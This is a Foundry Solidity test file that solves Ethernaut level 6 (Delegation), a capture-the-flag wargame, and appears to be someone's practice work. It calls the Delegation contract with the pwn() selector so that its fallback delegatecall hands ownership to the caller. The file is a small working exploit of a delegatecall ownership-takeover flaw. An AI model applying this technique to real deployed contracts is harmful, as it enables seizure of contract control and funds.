// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../../src/ethernaut/level_6/Delegate.sol";
import "../../src/ethernaut/level_6/Delegation.sol";

contract DelegationTest is Test {
    Delegate delegate;
    Delegation delegation;
    address alice;

    function setUp() public {
        alice = vm.addr(1);

        delegate = new Delegate(address(this));
        delegation = new Delegation(address(delegate));
    }

    function testAttack() public {
        vm.prank(alice);
        address(delegation).call(abi.encodeCall(delegate.pwn, ()));

        delegation.owner();
    }
}
